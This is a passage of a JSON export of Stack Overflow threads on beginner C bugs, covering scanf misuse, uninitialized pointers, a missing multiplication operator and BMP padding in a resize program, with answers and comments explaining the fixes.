"registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 4, "last_activity_date": 1499276743, "creation_date": 1499276743, "answer_id": 44932836, "question_id": 44932522, "link": "https://stackoverflow.com/questions/44932522/why-does-changing-the-order-of-variable-definitions-change-the-functioning-of-co/44932836#44932836", "title": "Why does changing the order of variable definitions change the functioning of code", "body": "<p>Here's your problem:</p>\n\n<pre><code>scanf(\"%s\",&amp;op);\n</code></pre>\n\n<p>The <code>%s</code> format specifier expects a pointer to <em>the first character of an array that can store a string</em>.  What you're passing in is the address of a <em>single character</em>.</p>\n\n<p>As a result, when you enter a symbol such as <code>+</code>, this gets written to <code>op</code>, but then a null byte is written to whatever memory happens to be next after <code>op</code> to complete the string.  By writing to memory you're not supposed to, this invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>With undefined behavior, anything can happen.   You program may crash, it may show unexpected results, or it may appear to work properly.  Also, making a seemingly unrelated change such as adding a <code>printf</code> for debugging or (as in your case) changing the order of variables can change the way undefined behavior manifests itself.</p>\n\n<p>To read a single character, you need to use the <code>%c</code> format specifier.  You'll also need to add a space to the format string before it to consume whitespace, namely the newline from the prior <code>scanf</code> call.  This is needed because <code>%c</code> does not skip whitespace by itself, unlike other format specifiers such as <code>%d</code> or <code>%s</code>.</p>\n\n<pre><code>scanf(\" %c\",&amp;op);\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 4813846, "user_type": "registered", "profile_image": "https://graph.facebook.com/839357259471677/picture?type=large", "display_name": "Dipendra Rana", "link": "https://stackoverflow.com/users/4813846/dipendra-rana"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1499277069, "creation_date": 1499275590, "last_edit_date": 1499277069, "question_id": 44932522, "link": "https://stackoverflow.com/questions/44932522/why-does-changing-the-order-of-variable-definitions-change-the-functioning-of-co", "title": "Why does changing the order of variable definitions change the functioning of code", "body": "<p>There is two code written in Dev-c++ first one is working properly and another one is not, Why??</p>\n\n<pre><code>/* this code is working properly*/\n\n#include&lt;stdio.h&gt;  \nint main()\n{  \n    char op;    // this is the point \n    int a,b,c;  // where another code differs\n    printf(\"Enter the two no.s:\");\n    scanf(\"%d %d\",&amp;a,&amp;b);\n    printf(\"Enter the operation(+/-/*//):\");\n    scanf(\"%s\",&amp;op);\n    switch(op)\n    { \n     case '+': c=a+b;\n               printf(\"%d\",c);\n               break;\n\n     case '-': c=a-b;\n               printf(\"%d\",c);\n               break;  \n\n     case '*': c=a*b;\n               printf(\"%d\",c);\n               break;  \n\n     case '/': c=a/b;\n               printf(\"%d\",c);\n               break;  \n\n     default: printf(\"Invalid Operation\");\n     }\n}\n</code></pre>\n\n<hr>\n\n<pre><code>/* this code is not working properly; only altered the declaration sequence of int and char*/\n\n#include&lt;stdio.h&gt; \nint main()\n{  \n     int a,b,c;   \n     char op;\n     printf(\"Enter the a:\");\n     scanf(\"%d %d\",&amp;a,&amp;b);\n     printf(\"Enter the operation(+/-/*//):\");\n     scanf(\"%s\",&amp;op);\n     switch(op)\n     { \n     case '+' : c=a+b;\n               printf(\"%d\",c);\n               break;\n\n     case '-' : c=a-b;\n               printf(\"%d\",c);\n               break;  \n\n     case '*' : c=a*b;\n               printf(\"%d\",c);\n               break;  \n\n     case '/' : c=a/b;\n               printf(\"%d\",c);\n               break;  \n\n     default: printf(\"Invalid Operation\");\n     }\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 5, "creation_date": 1499274857, "post_id": 44932271, "comment_id": 76840404, "body": "<code>250(n-1)</code> Is trying to  call a number, which is neither a function nor an object. What is your question? If your background is more math than programming, then try a <code>*</code>in between."}, {"owner": {"reputation": 11, "user_id": 8259714, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24469cd30d661093ef88725fe91e4edf?s=128&d=identicon&r=PG&f=1", "display_name": "Akshit ", "link": "https://stackoverflow.com/users/8259714/akshit"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1499274929, "post_id": 44932271, "comment_id": 76840445, "body": "Thank you.Putting a* worked."}, {"owner": {"reputation": 486140, "user_id": 1187415, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/LpTRB.png?s=128&g=1", "display_name": "Martin R", "link": "https://stackoverflow.com/users/1187415/martin-r"}, "edited": false, "score": 1, "creation_date": 1499275280, "post_id": 44932271, "comment_id": 76840662, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/28663599/called-object-is-not-a-function-or-function-pointer\">called object is not a function or function pointer</a>"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 8259714, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24469cd30d661093ef88725fe91e4edf?s=128&d=identicon&r=PG&f=1", "display_name": "Akshit ", "link": "https://stackoverflow.com/users/8259714/akshit"}, "edited": false, "score": 0, "creation_date": 1499276076, "post_id": 44932323, "comment_id": 76841097, "body": "Yes your answer helped me."}], "tags": [], "owner": {"reputation": 872, "user_id": 8077259, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/E1wSe.jpg?s=128&g=1", "display_name": "caylee", "link": "https://stackoverflow.com/users/8077259/caylee"}, "is_accepted": true, "score": 0, "last_activity_date": 1499274918, "creation_date": 1499274918, "answer_id": 44932323, "question_id": 44932271, "link": "https://stackoverflow.com/questions/44932271/object-is-not-a-function-or-function-pointer/44932323#44932323", "title": "object is not a function or function pointer", "body": "<p>In C, you always have to write a <code>*</code> character for multiplication, as this:</p>\n\n<pre><code>a=250*(n-1)+192;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 0, "last_activity_date": 1499274978, "creation_date": 1499274978, "answer_id": 44932351, "question_id": 44932271, "link": "https://stackoverflow.com/questions/44932271/object-is-not-a-function-or-function-pointer/44932351#44932351", "title": "object is not a function or function pointer", "body": "<p>You can't put a numeric constant right next to parenthesis like that.  This does not denote multiplication but a function call with <code>250</code> as the name of the function.</p>\n\n<p>Use the binary <code>*</code> operator for multiplication.</p>\n\n<pre><code>a=250*(n-1)+192;\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 8259714, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24469cd30d661093ef88725fe91e4edf?s=128&d=identicon&r=PG&f=1", "display_name": "Akshit ", "link": "https://stackoverflow.com/users/8259714/akshit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 44932323, "answer_count": 2, "score": 0, "last_activity_date": 1499275027, "creation_date": 1499274749, "last_edit_date": 1499275027, "question_id": 44932271, "link": "https://stackoverflow.com/questions/44932271/object-is-not-a-function-or-function-pointer", "title": "object is not a function or function pointer", "body": "<p>I am getting the following compilation error:</p>\n\n<blockquote>\n  <p>prog.c:13:5: error: called object is not a function or function pointer\n    a=250(n-1)+192; </p>\n</blockquote>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(){\n    long long n,a;\n    int t;\n\n    scanf(\"%d\",&amp;t);\n    while(t--){\n        scanf(\"%lld\",&amp;n);\n        a=250(n-1)+192;\n        printf(\"%lld\\n\",a);\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1499273341, "post_id": 44931885, "comment_id": 76839624, "body": "You have a pointer <code>a</code>, but <i>where does it point?</i>"}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1499273456, "post_id": 44931885, "comment_id": 76839698, "body": "Pointer fail UB :("}, {"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 1, "creation_date": 1499273489, "post_id": 44931885, "comment_id": 76839711, "body": "<i>I get strange behavior when I write to an array I have not allocated and then try to read it back. What&#39;s wrong?</i> A pointer to <code>int</code> is not an array, and you can&#39;t use it as one."}, {"owner": {"reputation": 2176, "user_id": 5402401, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/dPV49.jpg?s=128&g=1", "display_name": "0.sh", "link": "https://stackoverflow.com/users/5402401/0-sh"}, "reply_to_user": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1499273508, "post_id": 44931885, "comment_id": 76839722, "body": "@KenWhite o.O??"}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "reply_to_user": {"reputation": 2176, "user_id": 5402401, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/dPV49.jpg?s=128&g=1", "display_name": "0.sh", "link": "https://stackoverflow.com/users/5402401/0-sh"}, "edited": false, "score": 0, "creation_date": 1499273606, "post_id": 44931885, "comment_id": 76839771, "body": "@VictoryOsikwemhe inb4 &#39;..but pointers and arrays are the same - website ccrap.gunge.com says so!&#39;."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499273781, "post_id": 44931885, "comment_id": 76839871, "body": "Please provide a reference to the standard defining &quot;memory leak&quot; and one requiring the code to generate one."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499273940, "post_id": 44931885, "comment_id": 76839953, "body": "A &quot;resource leak&quot; (the general case of a memory leak) is if you allocate a &quot;resource&quot; and fail to deallocate it. Nowhere in your code do you allocate anything."}, {"owner": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 0, "creation_date": 1499273955, "post_id": 44931885, "comment_id": 76839967, "body": "Undefined Behavior because <code>a</code> is pointing to some memory which is not allocated to you. Use <code>malloc</code> or <code>calloc</code> or simply declare an array <code>int a[10]</code>. Moreover, what you encountered is not a memory leak but a segmentation fault. I suggest you to first get a strong hold on pointers, array, memory allocation and also read about runtime errors."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499275121, "post_id": 44931885, "comment_id": 76840558, "body": "DV for not enabling compiler warnings.  <code>int *a; ... scanf(&quot;%u&quot;,&amp;a[i]) ;</code>  Save time, enable all compiler warnings."}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 8260505, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8d11cd77acf79cfac7b44b97c535cd9e?s=128&d=identicon&r=PG&f=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/8260505/alex"}, "edited": false, "score": 0, "creation_date": 1499283135, "post_id": 44932156, "comment_id": 76845085, "body": "But what i cant see here why sending + didnt change any thing?"}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "reply_to_user": {"reputation": 15, "user_id": 8260505, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8d11cd77acf79cfac7b44b97c535cd9e?s=128&d=identicon&r=PG&f=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/8260505/alex"}, "edited": false, "score": 0, "creation_date": 1499284397, "post_id": 44932156, "comment_id": 76845821, "body": "You are using scanf in the wrong way. I don&#39;t really see the point in why something happens. scanf(&quot;%u&quot;) is used to read an unsigned integer, and you are sending something that is not."}], "tags": [], "owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "is_accepted": false, "score": 0, "last_activity_date": 1499280887, "last_edit_date": 1499280887, "creation_date": 1499274317, "answer_id": 44932156, "question_id": 44931885, "link": "https://stackoverflow.com/questions/44931885/weird-scanf-behaviour/44932156#44932156", "title": "Weird scanf behaviour", "body": "<p>Since you're not allocating any memory dynamically, you will not get a memory leak. You are, however, accessing unallocated memory, which is not the same as a memory leak.</p>\n\n<p>I'm not sure what you're trying to accomplish by entering a +, but the behavior of using an uninitialized pointer is undefined. </p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1499275333, "post_id": 44932428, "comment_id": 76840691, "body": "&quot; store 10 integers to an array&quot; + <code>int a[9]</code> should be reviewed."}], "tags": [], "owner": {"reputation": 41, "user_id": 8260516, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70faab3993530adbd69a2fcb3a51c297?s=128&d=identicon&r=PG&f=1", "display_name": "Nadeem Bhati", "link": "https://stackoverflow.com/users/8260516/nadeem-bhati"}, "is_accepted": false, "score": 1, "last_activity_date": 1499275300, "last_edit_date": 1499275300, "creation_date": 1499275213, "answer_id": 44932428, "question_id": 44931885, "link": "https://stackoverflow.com/questions/44931885/weird-scanf-behaviour/44932428#44932428", "title": "Weird scanf behaviour", "body": "<p>If you simply wanted to store 10 integers to an array and later printing them, this would do:-</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n    int a[9],i ; \n    printf(\"Hello, World!\\n\");\n    for(i = 0;i&lt;10;i++)`\n    {\n      scanf(\"%u\",&amp;a[i]);\n    }\n\n    for(i = 0;i&lt;10;i++) \n    {\n      printf(\"%d\\n\",a[i]) ; \n    }\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 15, "user_id": 8260505, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8d11cd77acf79cfac7b44b97c535cd9e?s=128&d=identicon&r=PG&f=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/8260505/alex"}, "edited": false, "score": 0, "creation_date": 1499284010, "post_id": 44934543, "comment_id": 76845569, "body": "The program i was dealing with was a vulnerable service l remarked this behaviour so i asked about it"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 15, "user_id": 8260505, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8d11cd77acf79cfac7b44b97c535cd9e?s=128&d=identicon&r=PG&f=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/8260505/alex"}, "edited": false, "score": 0, "creation_date": 1499284822, "post_id": 44934543, "comment_id": 76846060, "body": "Quite frail and vulnerable indeed"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 0, "last_activity_date": 1499283056, "creation_date": 1499283056, "answer_id": 44934543, "question_id": 44931885, "link": "https://stackoverflow.com/questions/44931885/weird-scanf-behaviour/44934543#44934543", "title": "Weird scanf behaviour", "body": "<p>Multiple problems in your code:</p>\n\n<ul>\n<li><code>a</code> is an uninitialized pointer, you should instead define it as an array of 10 <code>int</code>. As coded, your program has undefined behavior, it is quite surprising that it runs at all.</li>\n<li>you should check the return value of <code>scanf()</code>: if the conversion fails, it returns <code>0</code> or <code>EOF</code> and the destination is not modified, printing it has undefined behavior. Typing just a <code>+</code> sign for an integer results in a conversion failure.</li>\n</ul>\n\n<p>Here is a corrected version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void) {\n    int a[10], i; \n    printf(\"Hello, World!\\n\");\n    for (i = 0; i &lt; 10; i++) {\n        if (scanf(\"%u\", &amp;a[i]) != 1) {\n            fprintf(stderr, \"input error\\n\");\n            exit(1);\n        }\n    }\n    for (i = 0; i &lt; 10; i++) {\n        printf(\"%d\\n\", a[i]); \n    }\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 15, "user_id": 8260505, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8d11cd77acf79cfac7b44b97c535cd9e?s=128&d=identicon&r=PG&f=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/8260505/alex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 99, "favorite_count": 1, "answer_count": 3, "score": -4, "last_activity_date": 1500077039, "creation_date": 1499273256, "last_edit_date": 1500077039, "question_id": 44931885, "link": "https://stackoverflow.com/questions/44931885/weird-scanf-behaviour", "title": "Weird scanf behaviour", "body": "<p>I was working on a C program and I found a weird behaviour with <code>scanf</code>:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int *a, i; \n    printf(\"Hello, World!\\n\");\n    for (i = 0; i &lt; 10; i++) {\n        scanf(\"%u\", &amp;a[i]);\n    }\n    for (i = 0; i &lt; 10; i++) {\n        printf(\"%d\\n\", a[i]); \n    }\n    return 0;\n}\n</code></pre>\n\n<p>For 10 input I sent <code>+</code> and the output was like:</p>\n\n<pre><code>1                                                                                                                                                                                                             \n0                                                                                                                                                                                                             \n239646720                                                                                                                                                                                                     \n32767                                                                                                                                                                                                         \n0                                                                                                                                                                                                             \n0                                                                                                                                                                                                             \n239646727                                                                                                                                                                                                     \n32767                                                                                                                                                                                                         \n239646771                                                                                                                                                                                                     \n32767\n</code></pre>\n\n<p>I expected a memory leak, could any one please explain me this behaviour ?</p>\n"}, {"tags": ["c", "bitmap", "resize", "cs50"], "comments": [{"owner": {"reputation": 3270, "user_id": 3059385, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/dc876278926d67b3da29594601fdc82a?s=128&d=identicon&r=PG&f=1", "display_name": "Christopher Schneider", "link": "https://stackoverflow.com/users/3059385/christopher-schneider"}, "edited": false, "score": 0, "creation_date": 1499272430, "post_id": 44931591, "comment_id": 76839049, "body": "What does &quot;come out wrong&quot; mean?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1499273831, "post_id": 44931591, "comment_id": 76839895, "body": "Instead of a lame excuse, format your code properly."}, {"owner": {"reputation": 23, "user_id": 3482175, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6665f4885580b3a17a2dc8d7582828c8?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Niculescu", "link": "https://stackoverflow.com/users/3482175/alex-niculescu"}, "edited": false, "score": 0, "creation_date": 1499274302, "post_id": 44931591, "comment_id": 76840138, "body": "The picture does not come out as it is supposed to, the colors are messed up. It goes from <a href=\"http://imgur.com/8JUoKE7\" rel=\"nofollow noreferrer\">this</a> to <a href=\"http://imgur.com/8JUoKE7\" rel=\"nofollow noreferrer\">this</a>"}, {"owner": {"reputation": 69, "user_id": 4259835, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/606c50f1da1fd11aafccc3bf40db8871?s=128&d=identicon&r=PG&f=1", "display_name": "AJD-", "link": "https://stackoverflow.com/users/4259835/ajd"}, "edited": false, "score": 0, "creation_date": 1499274686, "post_id": 44931591, "comment_id": 76840328, "body": "Those links are identical, what is wrong with the image?"}, {"owner": {"reputation": 23, "user_id": 3482175, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6665f4885580b3a17a2dc8d7582828c8?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Niculescu", "link": "https://stackoverflow.com/users/3482175/alex-niculescu"}, "edited": false, "score": 0, "creation_date": 1499274970, "post_id": 44931591, "comment_id": 76840468, "body": "Sorry, this is the original image, <a href=\"http://imgur.com/7F7oNH4\" rel=\"nofollow noreferrer\">original image</a>"}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 3482175, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6665f4885580b3a17a2dc8d7582828c8?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Niculescu", "link": "https://stackoverflow.com/users/3482175/alex-niculescu"}, "edited": false, "score": 0, "creation_date": 1499275984, "post_id": 44931892, "comment_id": 76841059, "body": "It definitely helps but it seems to only work when the output doesn&#39;t have padding."}, {"owner": {"reputation": 1154, "user_id": 5329483, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/540d2cd6d0b20c87290f01247f8aae17?s=128&d=identicon&r=PG&f=1", "display_name": "user5329483", "link": "https://stackoverflow.com/users/5329483/user5329483"}, "reply_to_user": {"reputation": 23, "user_id": 3482175, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6665f4885580b3a17a2dc8d7582828c8?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Niculescu", "link": "https://stackoverflow.com/users/3482175/alex-niculescu"}, "edited": false, "score": 0, "creation_date": 1499277100, "post_id": 44931892, "comment_id": 76841670, "body": "@codefreak101: answer corrected - see writing of padding"}], "tags": [], "owner": {"reputation": 1154, "user_id": 5329483, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/540d2cd6d0b20c87290f01247f8aae17?s=128&d=identicon&r=PG&f=1", "display_name": "user5329483", "link": "https://stackoverflow.com/users/5329483/user5329483"}, "is_accepted": true, "score": 0, "last_activity_date": 1499277020, "last_edit_date": 1499277020, "creation_date": 1499273296, "answer_id": 44931892, "question_id": 44931591, "link": "https://stackoverflow.com/questions/44931591/padding-for-bitmap-file/44931892#44931892", "title": "Padding for bitmap file", "body": "<p>You use the same padding for the infile as for the outfile and you mixed up the pixels.</p>\n\n<pre><code>// read infile's BITMAPFILEHEADER\nBITMAPFILEHEADER bf;\nfread(&amp;bf, sizeof(BITMAPFILEHEADER), 1, inptr);\n\n// read infile's BITMAPINFOHEADER\nBITMAPINFOHEADER bi_in;\nfread(&amp;bi_in, sizeof(BITMAPINFOHEADER), 1, inptr);\n\n// ensure infile is (likely) a 24-bit uncompressed BMP 4.0\nif (bf.bfType != 0x4d42 || bf.bfOffBits != 54 || bi_in.biSize != 40 || \n    bi_in.biBitCount != 24 || bi_in.biCompression != 0)\n{\n    fclose(outptr);\n    fclose(inptr);\n    fprintf(stderr, \"Unsupported file format.\\n\");\n    return 4; \n}\n\n// build outfile's BITMAPINFOHEADER and Change height and width\nBITMAPINFOHEADER bi_out;\nbi_out=bi_in;\n\nbi_out.biHeight *= n;\nbi_out.biWidth *= n;\n\n// determine paddings\nint padding_in  = (4 - (bi_in.biWidth  * sizeof(RGBTRIPLE)) % 4) % 4;\nint padding_out = (4 - (bi_out.biWidth * sizeof(RGBTRIPLE)) % 4) % 4;\n\n// Change size and image size\nbi_out.biSizeImage = ((sizeof(RGBTRIPLE) * bi_out.biWidth) + padding_out) * abs(bi_out.biHeight);   \nbf.bfSize = bi_out.biSizeImage + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);\n\n// write outfile's BITMAPFILEHEADER\nfwrite(&amp;bf, sizeof(BITMAPFILEHEADER), 1, outptr);\n\n// write outfile's BITMAPINFOHEADER\nfwrite(&amp;bi_out, sizeof(BITMAPINFOHEADER), 1, outptr);\n\n// iterate over infile's scanlines\nfor (int i = abs(bi_in.biHeight); i--;)\n{\n    long StartOfScanline = ftell(inptr); //we have to return here\n    //resize vertically, issue the same line n times\n    for (int j = 0; j &lt; n; j++)\n    {\n        fseek(inptr,StartOfScanline, SEEK_SET); //go to start of line \n        for (int k=bi_in.biWidth; k--;) //for each pixel in line...\n        {   \n            RGBTRIPLE triple;\n            // read one RGB triple from infile\n            fread(&amp;triple, sizeof(RGBTRIPLE), 1, inptr);\n            for (int l=n;l--;) //write out pix n times \n                fwrite(&amp;triple, sizeof(RGBTRIPLE), 1, outptr);\n        }\n        // Add padding, if necessary\n        //This was wrong: fwrite needs a pointer to data, and not 0x00!!\n        //for (int l = 0; l &lt; padding_out; l++)\n        //    fwrite(0x00, 1, 1, outptr);\n        //FIXED:\n        static const char Padding[4]={0,0,0,0};\n        fwrite(Padding, padding_out, 1, outptr);\n\n    }\n    //add padding to infile\n    fseek(inptr, padding_in, SEEK_CUR);\n}\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 3482175, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6665f4885580b3a17a2dc8d7582828c8?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Niculescu", "link": "https://stackoverflow.com/users/3482175/alex-niculescu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1400, "favorite_count": 0, "accepted_answer_id": 44931892, "answer_count": 1, "score": 0, "last_activity_date": 1499277020, "creation_date": 1499272228, "question_id": 44931591, "link": "https://stackoverflow.com/questions/44931591/padding-for-bitmap-file", "title": "Padding for bitmap file", "body": "<p>I want to be able to resize bitmap pictures in C and I believe that there is some padding problem that makes the new picture come out wrong, but I do not know what the problem is.</p>\n\n<pre><code>/**\n* Copies a BMP piece by piece, just because.\n*/ \n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include \"bmp.h\"\n\nint main(int argc, char *argv[])\n{\n\ndouble n = atof(argv[1]);\n\n// ensure proper usage\nif (argc != 4)\n{\n    fprintf(stderr, \"Usage: ./resize n infile outfile\\n\");\n    return 1;\n}\n\nif (n &gt;= 100 || n &lt; 0)\n{\n    fprintf(stderr, \"n must be positibe and less than 100\\n\");\n    return 1;\n}\n\n// remember filenames\nchar *infile = argv[2];\nchar *outfile = argv[3];\n\n// open input file \nFILE *inptr = fopen(infile, \"r\");\nif (inptr == NULL)\n{\n    fprintf(stderr, \"Could not open %s.\\n\", infile);\n    return 2;\n}\n\n// open output file\nFILE *outptr = fopen(outfile, \"w\");\nif (outptr == NULL)\n{\n    fclose(inptr);\n    fprintf(stderr, \"Could not create %s.\\n\", outfile);\n    return 3;\n}\n\n// read infile's BITMAPFILEHEADER\nBITMAPFILEHEADER bf;\nfread(&amp;bf, sizeof(BITMAPFILEHEADER), 1, inptr);\n\n// read infile's BITMAPINFOHEADER\nBITMAPINFOHEADER bi;\nfread(&amp;bi, sizeof(BITMAPINFOHEADER), 1, inptr);\n\n// ensure infile is (likely) a 24-bit uncompressed BMP 4.0\nif (bf.bfType != 0x4d42 || bf.bfOffBits != 54 || bi.biSize != 40 || \n    bi.biBitCount != 24 || bi.biCompression != 0)\n{\n    fclose(outptr);\n    fclose(inptr);\n    fprintf(stderr, \"Unsupported file format.\\n\");\n    return 4;\n}\n\n\n\n// Change height and width\nbi.biHeight *= n;\nbi.biWidth *= n;\n\n// determine padding for outfile scanlines\nint padding = (4 - (bi.biWidth * 